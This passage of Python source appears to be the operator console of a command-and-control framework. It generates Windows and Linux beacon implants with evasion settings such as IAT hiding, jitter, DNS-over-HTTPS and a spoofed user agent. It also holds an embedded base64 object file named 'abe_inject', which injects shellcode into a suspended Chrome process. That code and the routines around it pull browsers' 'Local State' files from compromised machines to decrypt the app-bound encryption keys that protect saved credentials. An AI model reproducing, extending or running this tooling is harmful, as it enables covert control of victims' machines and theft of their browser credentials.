            console.print("[dim]Cancelled[/dim]")
            return
        if confirm and confirm not in ("y", "yes"):
            console.print("[dim]Cancelled[/dim]")
            return

        # ── Generate ─────────────────────────────────────────────────────
        console.print(f"[dim]Generating payload...[/dim]")
        try:
            filename, content = self.client.agent_generate(agent_type, config_str, [listener_name])
            save_path = output_path if output_path != default_name else os.path.join(os.getcwd(), output_path)
            if not os.path.isabs(save_path):
                save_path = os.path.join(os.getcwd(), save_path)

            with open(save_path, "wb") as f:
                f.write(content)

            size_kb = len(content) / 1024
            console.print(f"[green]Payload generated: {filename} ({size_kb:.1f} KB)[/green]")
            console.print(f"[green]Saved to: {save_path}[/green]")
        except Exception as e:
            console.print(f"[red]Generate failed: {e}[/red]")

    def _cmd_generate_flags(self, args, regs):
        """Non-interactive generate with --flag syntax."""
        import json as _json

        agent_type = args[0]
        if agent_type not in regs:
            console.print(f"[red]Unknown agent type: {agent_type}. Available: {', '.join(regs.keys())}[/red]")
            return

        listener_name = args[1]
        if listener_name not in self.client.listeners:
            available = ", ".join(self.client.listeners.keys()) or "(none)"
            console.print(f"[red]Unknown listener: {listener_name}. Available: {available}[/red]")
            return
        li_obj = self.client.listeners[listener_name]
        ar = regs[agent_type]
        if li_obj.reg_name not in ar.listeners:
            console.print(f"[red]Listener '{listener_name}' ({li_obj.reg_name}) not compatible with {agent_type}. Required: {', '.join(ar.listeners)}[/red]")
            return

        opts = {}
        i = 2
        while i < len(args):
            if args[i].startswith("--") and i + 1 < len(args):
                opts[args[i][2:]] = args[i + 1]
                i += 2
            else:
                i += 1

        if agent_type == "beacon":
            config = {
                "arch": opts.get("arch", "x64"),
                "format": opts.get("format", "Shellcode"),
                "sleep": opts.get("sleep", "30s"),
                "jitter": int(opts.get("jitter", "20")),
                "svcname": opts.get("svcname", ""),
                "is_killdate": False,
                "kill_date": "",
                "kill_time": "",
                "is_workingtime": False,
                "start_time": "",
                "end_time": "",
                "iat_hiding": opts.get("iat_hiding", "true").lower() == "true",
                "is_sideloading": False,
                "sideloading_content": "",
                "dns_resolvers": opts.get("dns_resolvers", "8.8.8.8,1.1.1.1,9.9.9.9"),
                "dns_mode": opts.get("dns_mode", "DNS (Direct UDP)"),
                "doh_resolvers": opts.get("doh_resolvers", "https://dns.google/dns-query,https://cloudflare-dns.com/dns-query"),
                "user_agent": opts.get("user_agent", "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"),
                "use_proxy": opts.get("use_proxy", "false").lower() == "true",
                "proxy_type": opts.get("proxy_type", "http"),
                "proxy_host": opts.get("proxy_host", ""),
                "proxy_port": int(opts.get("proxy_port", "0")),
                "proxy_username": opts.get("proxy_username", ""),
                "proxy_password": opts.get("proxy_password", ""),
                "rotation_mode": opts.get("rotation", "sequential"),
            }
        elif agent_type == "beacon_linux":
            config = {
                "arch": opts.get("arch", "linux/amd64"),
                "sleep": opts.get("sleep", "30s"),
                "jitter": int(opts.get("jitter", "20")),
                "user_agent": opts.get("user_agent", "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0"),
            }
        else:
            config = {
                "arch": opts.get("arch", "amd64"),
                "format": opts.get("format", "Binary EXE"),
                "sleep": opts.get("sleep", "30s"),
                "jitter": int(opts.get("jitter", "20")),
            }

        config_str = _json.dumps(config)
        output_path = opts.get("output", "")

        fmt_label = config.get('format', config.get('arch', 'binary'))
        console.print(f"[dim]Generating {agent_type} for {listener_name} (arch={config['arch']}, format={fmt_label})...[/dim]")

        try:
            filename, content = self.client.agent_generate(agent_type, config_str, [listener_name])
            save_path = output_path or os.path.join(os.getcwd(), filename)
            if not os.path.isabs(save_path):
                save_path = os.path.join(os.getcwd(), save_path)

            with open(save_path, "wb") as f:
                f.write(content)

            size_kb = len(content) / 1024
            console.print(f"[green]Agent generated: {filename} ({size_kb:.1f} KB)[/green]")
            console.print(f"[green]Saved to: {save_path}[/green]")
        except Exception as e:
            console.print(f"[red]Generate failed: {e}[/red]")

    # ─── Callbacks ────────────────────────────────────────────────────

    def _handle_console_output(self, agent_id: str, ptype: int, msg_type: int, message: str, clear_text: str):
        """Display console output from agents."""
        # Only show output for current agent in interact mode, otherwise prefix it
        agent = self.client.agents.get(agent_id)
        prefix = ""
        if agent_id != self.current_agent_id:
            label = f"{agent.computer}/{agent.username}" if agent else agent_id[:8]
            prefix = f"[dim][{label}][/dim] "

        text = clear_text or message
        if not text:
            return
        cleaned = self._clean_output(text)
        if not cleaned:
            return
        if ptype == TYPE_AGENT_CONSOLE_ERROR:
            console.print(f"{prefix}[red]{cleaned}[/red]")
        elif ptype == TYPE_AGENT_CONSOLE_LOCAL:
            console.print(f"{prefix}[yellow]{cleaned}[/yellow]")
        else:
            console.print(f"{prefix}{cleaned}", highlight=False)

    def _clean_output(self, text: str) -> str:
        """Strip noisy server output: CLIXML, command lines, base64 blobs."""
        import re as _re

        # CLIXML → extract only <ToString> messages
        if "#< CLIXML" in text:
            lines = []
            for part in text.split("#< CLIXML"):
                block = part.strip()
                if "<Objs" in block:
                    msgs = _re.findall(r"<ToString>(.*?)</ToString>", block)
                    if msgs:
                        lines.extend(msgs)
                        continue
                if block:
                    lines.append(block)
            text = "\n".join(lines) if lines else text

        # Filter line by line
        out = []
        for line in text.splitlines():
            s = line.strip()
            if s.startswith("Program "):
                continue
            if _re.match(r"^[A-Za-z0-9+/=]{30,}$", s):
                continue
            out.append(line)
        return "\n".join(out)

    def _handle_task_update(self, task):
        """Display task output/completion messages from agents."""
        agent = self.client.agents.get(task.agent_id)
        prefix = ""
        if task.agent_id != self.current_agent_id:
            label = f"{agent.computer}/{agent.username}" if agent else task.agent_id[:8]
            prefix = f"[dim][{label}][/dim] "

        raw = task.text or task.message or ""
        if not raw:
            return
        cleaned = self._clean_output(raw).rstrip("\n")
        if not cleaned:
            return
        if task.text:
            console.print(f"{prefix}{cleaned}", highlight=False)
        else:
            style = "green" if task.completed else "dim"
            console.print(f"{prefix}[{style}]{cleaned}[/{style}]", highlight=False)

    def _handle_notification(self, notif: dict):
        msg = notif.get("message", "")
        console.print(f"[dim][notification][/dim] {msg}")

    def _handle_chat(self, msg):
        console.print(f"[dim][chat][/dim] [bold]{msg.username}[/bold]: {msg.message}")

    def _handle_agent_event(self, event_type: str, agent):
        if event_type == "new":
            console.print(
                f"\n[bold green][+] New agent:[/bold green] {agent.id[:8]} "
                f"({agent.computer}/{agent.username} @ {agent.external_ip})"
            )
        elif event_type == "remove":
            console.print(
                f"\n[bold red][-] Agent removed:[/bold red] {agent.id[:8]} "
                f"({agent.computer}/{agent.username})"
            )

    def _handle_disconnect(self):
        console.print(
            "\n[bold yellow]⚠ Connection lost — reconnecting...[/bold yellow]"
        )

    def _handle_reconnect(self):
        n = len(self.client.agents)
        console.print(
            f"\n[bold green]✓ Reconnected[/bold green] "
            f"({n} agents synced)"
        )

    # ─── Helpers ──────────────────────────────────────────────────────

    def _find_agent(self, query: str) -> Optional:
        """Find agent by full ID, partial ID, or computer name."""
        # Exact ID
        if query in self.client.agents:
            return self.client.agents[query]

        # Partial ID match
        matches = [a for aid, a in self.client.agents.items() if aid.startswith(query)]
        if len(matches) == 1:
            return matches[0]

        # Computer name match
        matches = [a for a in self.client.agents.values()
                    if a.computer.lower() == query.lower()]
        if len(matches) == 1:
            return matches[0]

        # Username match
        matches = [a for a in self.client.agents.values()
                    if a.username.lower() == query.lower()]
        if len(matches) == 1:
            return matches[0]

        return None

    @staticmethod
    def _human_size(size: int) -> str:
        for unit in ("B", "KB", "MB", "GB"):
            if size < 1024:
                return f"{size:.1f} {unit}" if unit != "B" else f"{size} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    # ─── ABE key auto-decryption ─────────────────────────────────────

    # Embedded abe_inject BOF (compiled x64 COFF)
    _ABE_BOF_B64 = "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IC0tbm8tZmlyc3QtcnVuIC0tdXNlci1kYXRhLWRpcj1DOlxXaW5kb3dzXFRlbXBcYWJlX3RtcABrZXJuZWwzMi5kbGwATG9hZExpYnJhcnlBAFshXSBDYW5ub3QgcmVzb2x2ZSBMb2FkTGlicmFyeUEAWyFdIENyZWF0ZVByb2Nlc3MgZmFpbGVkOiAlbHUAWytdIENocm9tZSBQSUQgJWx1IChzdXNwZW5kZWQpAFsqXSBQcmVsb2FkaW5nIG9sZTMyLmRsbC4uLgBvbGUzMi5kbGwAWyFdIEZhaWxlZCB0byBwcmVsb2FkIG9sZTMyLmRsbCAoZXJyPSVsdSkAWypdIFByZWxvYWRpbmcgb2xlYXV0MzIuZGxsLi4uAG9sZWF1dDMyLmRsbABbIV0gRmFpbGVkIHRvIHByZWxvYWQgb2xlYXV0MzIuZGxsIChlcnI9JWx1KQBbK10gQ09NIERMTHMgbG9hZGVkAENvSW5pdGlhbGl6ZUV4AENvQ3JlYXRlSW5zdGFuY2UAQ29TZXRQcm94eUJsYW5rZXQAQ29VbmluaXRpYWxpemUAU3lzQWxsb2NTdHJpbmdCeXRlTGVuAFN5c1N0cmluZ0J5dGVMZW4AU3lzRnJlZVN0cmluZwBFeGl0VGhyZWFkAFshXSBSZXNvbHZlIGZhaWxlZABbK10gUmVzb2x2ZWQ6IENvSW5pdEV4PTB4JWxsWCwgRXhpdFRocmVhZD0weCVsbFgAWyFdIFZpcnR1YWxBbGxvY0V4IGZhaWxlZDogJWx1AFsrXSBEYXRhQDB4JXAgKFJXLCAlZCksIENvZGVAMHglcCAoUlcsICVkKQBbIV0gSGVhcCBhbGxvYyBmYWlsZWQAWyFdIFZQcm90ZWN0IFJXLT5SWCBmYWlsZWQ6ICVsdQBbKl0gVmVyaWZ5OiBkYXRhLnByb3RlY3Q9MHglbFgsIGNvZGUucHJvdGVjdD0weCVsWABbIV0gQ3JlYXRlUmVtb3RlVGhyZWFkIGZhaWxlZDogJWx1AFsrXSBTaGVsbGNvZGUgdGhyZWFkIHJ1bm5pbmcsIHBvbGxpbmcuLi4AWytdIERvbmUgYWZ0ZXIgJWRzAFshXSBDaHJvbWUgZGllZCBhdCAlZHMsIFByb2NFeGl0PTB4JTA4WABbKl0gVGhyZWFkIGV4aXRlZCBhdCAlZHMs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AgAAAAIAAAAAAHQAAAAAAAAAAAAAAAIAAAAAAJIAAAAAAAAAAAAAAAIAAAAAALQAAAAAAAAAAAAAAAIAAAAAANYAAAAAAAAAAAAAAAIAAAAAAPkAAAAAAAAAAAAAAAIAAAAAABoBAAAAAAAAAAAAAAIAAAAAADUBAAAAAAAAAAAAAAIAAAAAAEsBAAAAAAAAAAAAAAIAAAAAAGMBAAAAAAAAAAAAAAIAAAAAAHYBAAAAAAAAAAAAAAIAAAAAAIoBAAAAAAAAAAAAAAIAAAAAAJ8BAAAAAAAAAAAAAAIAAAAAAL8BAAAAAAAAAAAAAAIAAAAAAN0BAAAAAAAAAAAAAAIAAAAAAPsBAAAAAAAAAAAAAAIAAAAAABcCAAAAAAAAAAAAAAIAAAAAADMCAAAAAAAAAAAAAAIAAAAAAE4CAAAAAAAAAAAAAAIAAAAAAG4CAAAAAAAAAAAAAAIAAAAAAIICAAAAAAAAAAAAAAIAAAAAAKICAAAAAAAAAAAAAAIAAAAAAMACAAAAAAAAAAAAAAIAAAAAANUCAAAAAAAAAAAAAAIAAAAAAPYCAAAAAAAAAAAAAAIAAAAAABgDAAAAAAAAAAAAAAIAMgMAAC5yZGF0YSR6enoAcHJlbG9hZF9kbGwAQ2hyb21lX0NMU0lEAENocm9tZV9JSUQyAENocm9tZV9JSUQALnJkYXRhJHp6egBob2xsb3dfcGF5bG9hZF9iaW5fbGVuAGhvbGxvd19wYXlsb2FkX2JpbgBfX2ltcF9LRVJORUwzMiRWaXJ0dWFsQWxsb2NFeABfX2ltcF9LRVJORUwzMiRXcml0ZVByb2Nlc3NNZW1vcnkAX19pbXBfS0VSTkVMMzIkQ3JlYXRlUmVtb3RlVGhyZWFkAF9faW1wX0tFUk5FTDMyJFdhaXRGb3JTaW5nbGVPYmplY3QAX19pbXBfS0VSTkVMMzIkR2V0RXhpdENvZGVUaHJlYWQAX19pbXBfS0VSTkVMMzIkQ2xvc2VIYW5kbGUAX19pbXBfQmVhY29uRGF0YVBhcnNlAF9faW1wX0JlYWNvbkRhdGFFeHRyYWN0AF9faW1wX0JlYWNvblByaW50ZgBfX2ltcF9NU1ZDUlQkbWVtc2V0AF9faW1wX01TVkNSVCRzcHJpbnRmAF9faW1wX0tFUk5FTDMyJEdldE1vZHVsZUhhbmRsZUEAX19pbXBfS0VSTkVMMzIkR2V0UHJvY0FkZHJlc3MAX19pbXBfS0VSTkVMMzIkQ3JlYXRlUHJvY2Vzc1cAX19pbXBfS0VSTkVMMzIkR2V0TGFzdEVycm9yAF9faW1wX0tFUk5FTDMyJExvYWRMaWJyYXJ5QQBfX2ltcF9LRVJORUwzMiRHbG9iYWxBbGxvYwBfX2ltcF9LRVJORUwzMiRUZXJtaW5hdGVQcm9jZXNzAF9faW1wX01TVkNSVCRtZW1jcHkAX19pbXBfS0VSTkVMMzIkVmlydHVhbFByb3RlY3RFeABfX2ltcF9LRVJORUwzMiRWaXJ0dWFsUXVlcnlFeABfX2ltcF9LRVJORUwzMiRTbGVlcABfX2ltcF9LRVJORUwzMiRSZWFkUHJvY2Vzc01lbW9yeQBfX2ltcF9LRVJORUwzMiRHZXRFeGl0Q29kZVByb2Nlc3MAX19pbXBfS0VSTkVMMzIkR2xvYmFsRnJlZQA="

    _CHROME_PATHS = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    ]

    def _find_encrypted_abe_key(self, agent_id: str, browser: str = "chrome") -> bytes | None:
        """Find encrypted ABE key from downloaded Local State file."""
        import json as _json
        browser_paths = {
            "chrome": r"Google\Chrome",
            "msedge": r"Microsoft\Edge",
            "coccoc": r"CocCoc\Browser",
            "brave": r"BraveSoftware\Brave-Browser",
        }
        path_fragment = browser_paths.get(browser, browser_paths["chrome"])

        for dl in self.client.downloads.values():
            if dl.agent_id != agent_id or dl.state != 3:
                continue
            if "Local State" not in dl.filename:
                continue
            if path_fragment not in dl.filename:
                continue
            try:
                _, content = self.client.download_sync(dl.file_id)
                data = _json.loads(content)
                enc_key_b64 = data.get("os_crypt", {}).get("app_bound_encrypted_key", "")
                if enc_key_b64:
                    raw = base64.b64decode(enc_key_b64)
                    if raw[:4] == b"APPB":
                        raw = raw[4:]
                    return raw
            except Exception:
                continue
        return None

    def _run_abe_bof(self, agent_id: str, encrypted_key: bytes, chrome_path: str | None = None) -> bytes | None:
        """Run abe_inject BOF to decrypt ABE key. Returns decrypted key bytes or None."""
        import struct as _struct
        import re as _re

        if not chrome_path:
            chrome_path = self._CHROME_PATHS[0]

        bof_bytes = base64.b64decode(self._ABE_BOF_B64)
        bof_b64 = base64.b64encode(bof_bytes).decode()

        def bof_pack(fmt_types, values):
            data = b""
            for fmt, val in zip(fmt_types, values):
                if fmt == "cstr":
                    s = val.encode("utf-8") + b"\x00"
                    data += _struct.pack("<I", len(s)) + s
                elif fmt == "bytes":
                    data += _struct.pack("<I", len(val)) + val
            return _struct.pack("<I", len(data)) + data

        params = bof_pack(["cstr", "bytes"], [chrome_path, encrypted_key])
        params_b64 = base64.b64encode(params).decode()

        console.print(f"[cyan]  Running ABE decrypt BOF (key={len(encrypted_key)}B)...[/cyan]")

        # Send BOF
        data = {
            "command": "execute",
            "subcommand": "bof",
            "bof": bof_b64,
            "param_data": params_b64,
        }
        try:
            self.client.agent_command_execute(agent_id, "execute bof abe_inject", data=data)
        except Exception as e:
            console.print(f"[red]  ABE BOF send failed: {e}[/red]")
            return None

        # Wait for completion (up to 90s)
        console.print("[dim]  Waiting for ABE decrypt (up to 90s)...[/dim]")
        for _ in range(45):
            time.sleep(2)
            try:
                tasks = self.client.task_list(agent_id)
            except Exception:
                continue
            for t in tasks:
                cl = t.get("a_cmdline", "")
                if "abe_inject" in cl and t.get("a_completed"):
                    text = t.get("a_text", "") or t.get("a_message", "")
                    m = _re.search(r'Decrypted ABE key \(\d+ bytes\): ([0-9a-f]+)', text)
                    if m:
                        key_hex = m.group(1)
                        key_bytes = bytes.fromhex(key_hex)
